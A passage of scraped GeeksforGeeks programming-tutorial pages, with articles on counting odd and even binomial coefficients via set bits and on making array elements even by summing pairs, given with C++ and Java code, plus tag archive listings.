(Naive and Dynamic Programming)Program to find whether a no is power of twoHow to swap two numbers without using a temporary variable?Josephus problem | Set 1 (A O(n) Solution)Binary representation of a given numberFind the element that appears onceBits manipulation (Important tactics)Little and Big Endian MysteryAdd two numbers without using arithmetic operatorsCount total set bits in all numbers from 1 to nC++ bitset and its applicationPosition of rightmost set bitFind the Number Occurring Odd Number of Times1's and 2's complement of a Binary NumberCyclic Redundancy Check and Modulo-2 DivisionBitwise right shift operators in JavaFind the two non-repeating elements in an array of repeating elements/ Unique Numbers 2Rotate bits of a numberWrite an Efficient C Program to Reverse Bits of a NumberDivide two integers without using multiplication, division and mod operatorFind most significant set bit of a numberCount inversions in an array | Set 3 (Using BIT)Sum of bit differences among all pairsFind XOR of two number without using XOR operatorCount number of bits to be flipped to convert A to B Count odd and even Binomial Coefficients of N-th power Last Updated: 21-12-2020 Given an integer N, the task is to count the number of even and odd binomial coefficients up to Nth power. Examples: Input: N = 4Output:Odd: 2Even: 3Explanation:The binomial coefficients are as follows:4C0 = 1, 4C1 = 4 , 4C2 = 6 , 4C3 = 4 , 4C4 = 1.Therefore, it can be observed that there exists exactly 2 odd and 3 even Binomial Coefficients. Input: N = 5Output:Odd: 4Even: 2Explanation:The binomial coefficients are as follows:5C0 = 1, 5C1 = 5, 5C2 = 10, 5C3 = 10, 5C4 = 5, 5C5 = 1.Therefore, there are 4 odd and 2 even coefficients. Recommended: Please try your approach on {IDE} first, before moving on to the solution. Solution Approach: The idea to solve this problem is using Bit Manipulation. Find the set bits in the given integer N. Count of odd binomial coefficients are equal to 2 ^ Count of Set Bits in N. Similarly the count of even binomial coefficients is equal to (N + 1 – 2 ^ Count of Set Bits in N). Below is the implementation of the above approach: C++ filter_none edit close play_arrow link brightness_4 code // C++ program for the above approach #include <iostream> #include <math.h> using namespace std; // Function to count set bits in // binary representation of number N int countSetBits(int N) { int count = 0; // Count set bits in N while (N) { N = N & (N - 1); count++; } // Return the final count return count; } // Driver Code int main() { int N = 4; int bits = countSetBits(N); // Print odd Binomial coefficents cout << "Odd " << ": " << pow(2, bits) << "\n"; // Print even Binomial coefficents cout << "Even " << ": " << N + 1 - pow(2, bits) << "\n"; return 0; } chevron_right filter_none Java filter_none edit close play_arrow link brightness_4 code // Java program for the above approach import java.util.*; class GFG{ // Function to count set bits in // binary representation of number N static int countSetBits(int N) { int count = 0; // Count set bits in N while (N != 0) { N = N & (N - 1); count++; } // Return the final count return count; } // Driver code public static void main(String[] args) { int N = 4; int bits = countSetBits(N); // Print odd Binomial coefficents System.out.println("Odd " + ": " + (int)(Math.pow(2, bits))); // Print even Binomial coefficents System.out.println("Even " + ": " + (N + 1 - (int)(Math.pow(2, bits)))); } } // This code is contributed by susmitakundugoaldanga chevron_right filter_none Output: Odd : 2 Even : 3 Time Complexity: O(1)Auxiliary Space: O(1) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Find sum of even index binomial coefficientsMathematics | PnC and Binomial CoefficientsSum of Binomial coefficientsProgram for Binomial Coefficients tableSum of squares of binomial coefficientsSum of product of consecutive Binomial CoefficientsSum of all products of the Binomial Coefficients of two numbers up to KCheck if a number has an odd count of odd divisors and even count of even divisorsCount of integers in a range which have even number of odd digits and odd number of even digitsCount numbers from given range having odd digits at odd places and even digits at even placesCount of even and odd power pairs in an ArrayFind the sum of power of bit count raised to the power BMake all the elements of array odd by incrementing odd-indexed elements of odd-length subarraysFind power of power under mod of a primeCheck if given number is a power of d where d is a power of 2Compute power of power k times % mLarger of a^b or b^a (a raised to power b or b raised to power a)Minimum steps to reach the Nth stair in jumps of perfect power of 2Check if count of even divisors of N is equal to count of odd divisorsGenerate an Array in which count of even and odd sum sub-arrays are E and O respectivelyKrishnaHareCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Bit MagicMathematicalbinomial coefficientnumber-digitssetBitCount Practice Tags : MathematicalBit Magic thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Make all array elements even by replacing any pair of array elements with their sum Next last_page Sum of Bitwise OR of each array element of an array with all elements of another array Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Bit Magic Operators in C | Set 2 (Relational and Logical Operators)Bit Fields in CCheck whether K-th bit is set or notBuiltin functions of GCC compilerCalculate XOR from 1 to n. Most visited in Mathematical Program for Fibonacci numbersC++ Data TypesSet in C++ Standard Template Library (STL)Write a program to print all permutations of a given stringProgram for factorial of a number room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

binomial coefficient Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Binomial Coefficient | DP-9Pascal's TriangleProgram to calculate value of nCrCompute nCr % p | Set 1 (Introduction and Dynamic Programming Solution)Space and time efficient Binomial CoefficientCompute nCr % p | Set 3 (Using Fermat Little Theorem)Eggs dropping puzzle (Binomial Coefficient and Binary Search Solution)Number Theory (Interesting Facts and Algorithms)Lobb NumberMathematics | Generalized PnC Set 1Mathematics | PnC and Binomial CoefficientsQueries of nCr%p in O(1) time complexityWays of selecting men and women from a group to make a teamSum of Binomial coefficientsNumber of distinct subsets of a setNumber of ways to go from one point to another in a gridMathematics | Generalized PnC Set 2Program to print binomial expansion seriesCalculate nCr using Pascal's TriangleCount the number of special permutationsSum of average of all subsetsCount permutations of given array that generates the same Binary Search Tree (BST)Corollaries of Binomial TheoremSum of squares of binomial coefficientsPascal MatrixOdd numbers in N-th row of Pascal's TriangleWays of dividing a group into two halves such that two elements are in different groupsProgram for Binomial Coefficients tableFind sum of even index binomial coefficientsNumber of words that can be made using exactly P consonants and Q vowels from the given string Tag Archives: binomial coefficient Count odd and even Binomial Coefficients of N-th power Last Updated: 21-12-2020 Given an integer N, the task is to count the number of even and odd binomial coefficients up to Nth power. Examples: Input: N =… Read More » Bit MagicMathematicalbinomial coefficientnumber-digitssetBitCount Count sequences of given length having non-negative prefix sums that can be generated by given values Last Updated: 25-10-2020 Given two integers M and X, the task is to find the number of sequences of length M that can be generated comprising of X… Read More » CombinatorialGreedyMathematicalPattern Searchingbinomial coefficientcatalanPermutation and Combination Count permutations of given array that generates the same Binary Search Tree (BST) Last Updated: 16-10-2020 Given an array, arr[] of size N consisting of elements from the range [1, N], that represents the order, in which the elements are inserted… Read More » ArraysBinary Search TreeCombinatorialMathematicalRecursionTreebinomial coefficientfactorialPermutation and Combination Count distinct regular bracket sequences which are not N periodic Last Updated: 28-09-2020 2 Given an integer N, the task is to find the number of distinct bracket sequences that can be formed using 2 * N brackets such… Read More » CombinatorialMathematicalSearchingStringsbinomial coefficientcatalanPermutation and Combination Sum of all products of the Binomial Coefficients of two numbers up to K Last Updated: 08-09-2020 3 Given three integers N, M and K, the task is to calculate the sum of products of Binomial Coefficients C(N, i) and C(M, K –… Read More » CombinatorialMathematicalbinomial coefficientPermutation and Combination Central binomial coefficient Last Updated: 16-09-2020 Given an integer N, the task is to find the Central binomial coefficient. The first few Central binomial coefficients for N = 0, 1, 2,… Read More » Mathematicalbinomial coefficientseries Number of ways to color N-K blocks using given operation Last Updated: 09-12-2020 3 Given N blocks out of which K are colored. These K colored blocks are denoted by an array arr[]. The task is to count the… Read More » AlgorithmsAnalysisArraysCombinatorialCompetitive ProgrammingDynamic ProgrammingMathematicalRecursionAlgorithms-Recursionbinomial coefficientPermutation and Combination Count non decreasing subarrays of size N from N Natural numbers Last Updated: 11-02-2020 Given are N natural numbers, the task is to find the count of the subarrays of size N that can be formed using elements from… Read More » CombinatorialMathematicalbinomial coefficientsubarray Number of words that can be made using exactly P consonants and Q vowels from the given string Last Updated: 21-10-2019 3 Given a string str and two integers P and Q. The task is to find the total count of words that can be formed by… Read More » CombinatorialMathematicalbinomial coefficientfactorialvowel-consonant Number of ways of choosing K equal substrings of any length for every query Last Updated: 14-11-2019 Given a string str and Q queries. Each query consists of an integer K. The task is to find the number of ways of choosing… Read More » CombinatorialMathematicalbinomial coefficientConstructive Algorithms Number of ways to go from one point to another in a grid Last Updated: 08-05-2019 2 Given the NxN grid of horizontal and vertical roads. The task is to find out the number of ways that the person can go from… Read More » Combinatorialbinomial coefficientfactorialPermutation and Combination Ways to Remove Edges from a Complete Graph to make Odd Edges Last Updated: 08-03-2019 3 Given a complete graph with N vertices, the task is to count the number of ways to remove edges such that the resulting graph has… Read More » GraphMathematicalbinomial coefficient Calculate nCr using Pascal’s Triangle Last Updated: 30-04-2020 A useful application of Pascal’s triangle is the calculation of combinations. The formula to find nCr is n! / r! * (n – r)! which… Read More » Competitive ProgrammingMathematicalbinomial coefficient Count the number of special permutations Last Updated: 29-11-2019 3 Given two positive integers n and k, the task is to count the number of special permutations. A special permutation P is defined as a… Read More » AlgorithmsCombinatorialDynamic ProgrammingMathematicalbinomial coefficientTechnical Scripter 2018 Ways of selecting men and women from a group to make a team Last Updated: 03-01-2019 Given four integers n, w, m and k where, m is the total number of men. w is the total number of women. n is… Read More » CombinatorialMathematicalbinomial coefficient Page 1 of 41234» Most popular in binomial coefficient Sum of product of r and rth Binomial Coefficient (r * nCr)Number of ways to color N-K blocks using given operationMiddle term in the binomial expansion seriesPentatope numberWays to Remove Edges from a Complete Graph to make Odd Edges Most visited in binomial coefficient Leibniz harmonic triangleSum of product of consecutive Binomial Coefficientsbeta(), betaf() and betal() functions in C++ STLMaximum binomial coefficient term valueCount distinct regular bracket sequences which are not N periodic room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Make all array elements even by replacing any pair of array elements with their sum - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Arrays in JavaWrite a program to reverse an array or stringProgram for array rotationLargest Sum Contiguous SubarrayStack Data Structure (Introduction and Program)Find the smallest and second smallest elements in an arrayArrays in C/C++Sort elements by frequency | Set 1Write a program to reverse an array or stringSubset Sum Problem | DP-25K'th Smallest/Largest Element in Unsorted Array | Set 1Given an array A[] and a number x, check for pair in A[] with sum as xSearch an element in a sorted and rotated arrayCount Inversions in an array | Set 1 (Using Merge Sort)Linear SearchFind subarray with given sum | Set 1 (Nonnegative Numbers)Find the Missing NumberPrint a given matrix in spiral formSliding Window Maximum (Maximum of all subarrays of size k)Linked List vs ArrayQueue | Set 1 (Introduction and Array Implementation)Next Greater ElementStock Buy Sell to Maximize ProfitArray of Strings in C++ (5 Different Ways to Create)Trapping Rain WaterMultidimensional Arrays in JavaSort an array of 0s, 1s and 2sk largest(or smallest) elements in an array | added Min Heap methodPython | Using 2D arrays/lists the right wayUgly Numbers Make all array elements even by replacing any pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] consisting of N positive integers, the task is to make all array elements even by replacing any pair of array elements with their sum. Examples: Input: arr[] = {5, 6, 3, 7, 20}Output: 3Explanation: Operation 1: Replace arr[0] and arr[2] by their sum ( = 5 + 3 = 8) modifies arr[] to {8, 6, 8, 7, 20}.Operation 2: Replace arr[2] and arr[3] by their sum ( = 7 + 8 = 15) modifies arr[] to {8, 6, 15, 15, 20}.Operation 3: Replace arr[2] and arr[3] by their sum ( = 15 + 15 = 30) modifies arr[] to {8, 6, 30, 30, 20}. Input: arr[] = {2, 4, 16, 8, 7, 9, 3, 1}Output: 2 Approach: The idea is to keep replacing two odd array elements by their sum until all array elements are even. Follow the steps below to solve the problem: Initialize a variable, say moves, to store the minimum number of replacements required. Calculate the total number of odd elements present in the given array and store it in a variable, say cnt. If the value of cnt is odd, then print (cnt / 2 + 2) as the result. Otherwise, print cnt / 2 as the result. Below is the implementation of the above approach: C++ filter_none edit close play_arrow link brightness_4 code // C++ program for the above approach #include <bits/stdc++.h> using namespace std; // Function to find the minimum number // of replacements required to make // all array elements even void minMoves(int arr[], int N) { // Stores the count of odd elements int odd_element_cnt = 0; // Traverse the array for (int i = 0; i < N; i++) { // Increase count of odd elements if (arr[i] % 2 != 0) { odd_element_cnt++; } } // Store number of replacements required int moves = (odd_element_cnt) / 2; // Two extra moves will be required // to make the last odd element even if (odd_element_cnt % 2 != 0) moves += 2; // Print the minimum replacements cout << moves; } // Driver Code int main() { int arr[] = { 5, 6, 3, 7, 20 }; int N = sizeof(arr) / sizeof(arr[0]); // Function call minMoves(arr, N); return 0; } chevron_right filter_none Output: 3 Time complexity: O(N)Auxiliary Space: O(N) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Maximize modulus by replacing adjacent pairs with their modulus for any permutation of given ArrayMinimize array length by repeatedly replacing pairs of unequal adjacent array elements by their sumReplace the odd positioned elements with their cubes and even positioned elements with their squaresMaximize array sum by replacing equal adjacent pairs by their sum and X respectivelyPossible values of Q such that, for any value of R, their product is equal to X times their sumMaximize sum of squares of array elements possible by replacing pairs with their Bitwise AND and Bitwise ORMinimize array sum by replacing greater and smaller elements of pairs by half and double of their values respectively atmost K timesMinimize cost to reduce array to a single element by replacing K consecutive elements by their sumMaximize count of equal numbers in Array of numbers upto N by replacing pairs with their sumMinimize remaining array element by repeatedly replacing pairs by half of one more than their sumArray value by repeatedly replacing max 2 elements with their absolute differenceMinimize the maximum difference of any pair by doubling odd elements and reducing even elements by halfLast element remaining by deleting two largest elements and replacing by their absolute difference if they are unequalMinimize the sum calculated by repeatedly removing any two elements and inserting their sum to the ArrayQueries to check if any pair exists in an array having values at most equal to the given pairSmallest array that can be obtained by replacing adjacent pairs with their productsReduce array to a single element by repeatedly replacing adjacent unequal pairs with their maximumModify sequence of first N natural numbers to a given array by replacing pairs with their GCDMinimize remaining array element by removing pairs and replacing them by their absolute differenceCount of pairs in a given range with sum of their product and sum equal to their concatenated numbernk14646Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : ArraysMathematicalarray-rearrangefrequency-counting Practice Tags : ArraysMathematical thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Make all array elements even by replacing adjacent pair of array elements with their sum Next last_page Sum of Bitwise OR of each array element of an array with all elements of another array Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Arrays Maximum and minimum of an array using minimum number of comparisonsProgram to find largest element in an arrayRemove duplicates from sorted arrayFind Second largest element in an arrayFind duplicates in O(n) time and O(1) extra space | Set 1 Most visited in Mathematical Program for Fibonacci numbersC++ Data TypesProgram for factorial of a numberSet in C++ Standard Template Library (STL)Write a program to print all permutations of a given string room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

array-rearrange Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Move all negative numbers to beginning and positive to end with constant extra spaceRearrange positive and negative numbers in O(n) time and O(1) extra spaceRearrange array in alternating positive & negative items with O(1) extra space | Set 1Rearrange an array such that arr[i] = iRearrange an array in maximum minimum form | Set 2 (O(1) extra space)Sort an array in wave formRearrange positive and negative numbers with constant extra spaceMinimum swaps required to bring all elements less than or equal to k togetherRearrange an array in order - smallest, largest, 2nd smallest, 2nd largest, ..Rearrange array such that arr[i] >= arr[j] if i is even and arr[i]<=arr[j] if i is odd and j < iAlternative SortingMove all zeroes to end of array | Set-2 (Using single traversal)In-Place AlgorithmEven numbers at even index and odd numbers at odd indexSegregate even and odd numbers | Set 3Rearrange array such that even positioned are greater than oddRearrange positive and negative numbers using inbuilt sort functionSort an array according to absolute difference with given valueMove all negative elements to end in order with extra space allowedDouble the first element and move zero to endThree way partitioning of an array around a given rangePositive elements at even and negative at odd positions (Relative order not maintained)Rearrange array such that even index elements are smaller and odd index elements are greaterRearrange Odd and Even values in Alternate Fashion in Ascending OrderMinimum number of adjacent swaps for arranging similar elements togetherMaximize sum of consecutive differences in a circular arraySegregate even and odd numbers | Set 2Move matrix elements in given direction and add elements with same valueDistinct adjacent elements in an arrayShuffle array {a1, a2, .. an, b1, b2, .. bn} as {a1, b1, a2, b2, a3, b3, ……, an, bn} without using extra space Tag Archives: array-rearrange Make all array elements even by replacing any pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] consisting of N positive integers, the task is to make all array elements even by replacing any pair of array elements… Read More » ArraysMathematicalarray-rearrangefrequency-counting Make all array elements even by replacing adjacent pair of array elements with their sum Last Updated: 21-12-2020 Given an array arr[] of size N, the task is to make all array elements even by replacing a pair of adjacent elements with their… Read More » ArraysMathematicalSearchingarray-rearrangefrequency-countingsubarray Split array into K subarrays with minimum sum of absolute difference between adjacent elements Last Updated: 21-12-2020 Given an array, arr[] of size N and an integer K, the task is to split the array into K subarrays minimizing the sum of… Read More » ArraysMathematicalSortingarray-rearrangesubarray Minimize the maximum difference of any pair by doubling odd elements and reducing even elements by half Last Updated: 20-12-2020 Given an array arr[] consisting of N positive integers, the task is to minimize the maximum difference between any pair of array elements by multiplying… Read More » ArraysHashMathematicalarray-rearrangecpp-setNatural Numbers Minimum sum of values subtracted from array elements to make all array elements equal Last Updated: 18-12-2020 Given an array arr[] consisting of N positive integers, the task is to find the sum of all the array elements required to be subtracted… Read More » ArraysGreedyMathematicalarray-rearrange Minimum number of operations required to make all elements of at least one row of given Matrix prime Last Updated: 11-12-2020 Given a matrix, mat[][] of size N * M, the task is to find the minimum count of operations required to make all elements of… Read More » ArraysDynamic ProgrammingMathematicalarray-rearrangeBitwise-OR Queries to replace subarrays by equal length arrays with at most P replacements allowed for any array element Last Updated: 15-12-2020 2 Given an array, arr[] of size N, an integer P and a 2D array Q[][] consisting of queries of the following type: 1 L R… Read More » Arraysarray-range-queriesarray-rearrangedisjoint-setsubarrayunion-find Minimize cost to reduce array to a single element by replacing K consecutive elements by their sum Last Updated: 10-12-2020 Given an array arr[] of size N and an integer K, the task is to find the minimum cost required to reduce given array to… Read More » ArraysDynamic ProgrammingInterview ExperiencesMathematicalRecursionarray-rearrange Minimum replacements required to make given Matrix palindromic Last Updated: 15-12-2020 Given a matrix with N rows and M columns, the task is to find the minimum replacements requried to make all rows and columns of… Read More » HashMathematicalMatrixPattern Searchingarray-rearrangepalindrome Lexicographically largest N-length Bitonic sequence made up of elements from given range Last Updated: 15-12-2020 Given three integers N, low and high, the task is to find the lexicographically largest bitonic sequence consisting of N elements lying in the range… Read More » ArraysMathematicalPattern Searchingarray-rearrangebitoniclexicographic-ordering Maximize frequency of an element by at most one increment or decrement of all array elements Last Updated: 15-12-2020 Given an array arr[] of size N, the task is to find the maximum frequency of any array element by incrementing or decrementing each array… Read More » ArraysGreedyMathematicalSearchingarray-rearrangefrequency-countingGreedy Algorithms Minimize cost to empty given array where cost of removing an element is its absolute difference with Time instant Last Updated: 17-12-2020 Given an array arr[] consisting of N integers, the task is to find the minimum cost to remove all elements from the array such that… Read More » ArraysDynamic ProgrammingRecursionarray-rearrange Minimize consecutive removals of elements of the same type to empty given array Last Updated: 15-12-2020 Given an array A[ ] consisting of N positive integers, such that each array element Ai denotes the count of elements of ith type, the… Read More » ArraysGreedyMathematicalSortingarray-rearrange Convert given upper triangular Matrix to 1D Array Last Updated: 07-12-2020 5 Given an upper triangular matrix M[][] of dimensions N * N, the task is to convert it into an one-dimensional array storing only non-zero elements… Read More » ArraysMathematicalMatrixSchool ProgrammingTechnical Scripterarray-rearrangeTechnical Scripter 2020 Queries to count minimum flips required to fill a binary submatrix with 0s only Last Updated: 18-12-2020 Given a binary matrix mat[][] of size M * N and Q queries of the form {pi, pj, qi, qj}, the task for each query… Read More » MathematicalMatrixarray-rearrangeprefixprefix-sumsubmatrix Page 1 of 1312345...10...»Last » Most popular in array-rearrange Make all array elements even by replacing any pair of array elements with their sumRearrange array by interchanging positions of even and odd elements in the given arrayMinimize the maximum difference of any pair by doubling odd elements and reducing even elements by halfSplit the array and add the first part to the end | Set 2Minimum number of operations required to make all elements of at least one row of given Matrix prime Most visited in array-rearrange Lambda expression in Python to rearrange positive and negative numbersConvert given upper triangular Matrix to 1D ArraySegregate Even and Odd numbers | Set 2Minimize consecutive removals of elements of the same type to empty given arraySearch insert position of K in a sorted array room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

frequency-counting Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Remove duplicates from a given stringCounting frequencies of array elementsFrequency of a substring in a stringCounting the frequencies in a list using dictionary in PythonFind frequency of each word in a string in PythonCount Triplets such that one of the numbers can be written as sum of the other 